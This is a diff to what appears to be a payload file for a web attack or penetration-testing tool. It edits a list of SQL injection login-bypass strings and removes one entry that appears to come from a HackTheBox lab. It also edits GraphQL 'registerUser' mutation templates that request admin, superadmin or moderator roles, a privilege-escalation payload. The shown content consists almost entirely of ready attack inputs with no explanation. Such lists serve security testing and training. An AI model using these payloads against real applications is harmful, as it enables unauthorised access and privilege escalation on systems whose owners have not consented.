@@ -22,7 +22,6 @@
       "' OR 1=1--",
       "\" OR 1=1--",
       "admin'--",
-      "htb-stdnt' --",
       "' AND '1'='1",
       "' AND '1'='2",
       "x' OR 'x'='x",
@@ -280,7 +279,7 @@
       "true"
     ],
 
-    "register_admin":       "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"admin\", msg: \"pwned\"}) { user { username role } } }",
+    "register_admin":       "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"admin\"}) { user { username role } } }",
     "register_basic":       "mutation { registerUser(input: {username: \"%s\", password: \"%s\"}) { user { username } } }",
     "register_superadmin":  "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"superadmin\"}) { user { username role } } }",
     "register_moderator":   "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"moderator\"}) { user { username role } } }",
